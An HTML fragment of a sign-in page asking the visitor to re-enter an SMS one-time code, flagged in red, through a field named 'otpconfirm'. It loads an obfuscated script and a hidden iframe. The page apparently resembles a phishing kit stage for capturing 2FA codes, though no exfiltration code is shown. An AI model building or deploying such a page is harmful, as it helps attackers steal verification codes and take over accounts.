...
<body class="">
  ...
  <p>Please check your phone  and enter the 6-digit code sent via sms to complete your sign in.</p>
  </div>


  <div class="form-fields">
  <div class="field text m_code">
  <label class="required" for="multifactor_code" style= "color: red;">Re-Enter the 6-digit code</label>
  <input maxlength="6" pattern="[0-9]*" placeholder="______" required="required" autocomplete="one-time-code" size="6" type="text" name="otpconfirm" id="multifactor_code">
  <span role="alert">
  ...
  <p>Make sure to enter the correct 6-digit code that was sent to your phone.<a href="#"></a></p>
  </div>
  
  <div class="form-actions">
  <div class="form-action-button">
  <button name="submit" type="submit" class="btn btn-primary" data-disable="true" data-clicked="">Continue</button>
  </div>
  </div>
  ...
  <script type="text/javascript" src="/NnCY6vf48/1H/Pa/SKupt_XE_TXGgY/iSYtrVJbfJSY9u/Rz9EDlMEJRE/NA/JnRAA2Dlg"></script>
  
  <iframe data-product="web_widget" title="No content" role="presentation" tabindex="-1" allow="microphone *" aria-hidden="true" src="about:blank" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -9999px;"></iframe></body>
</html>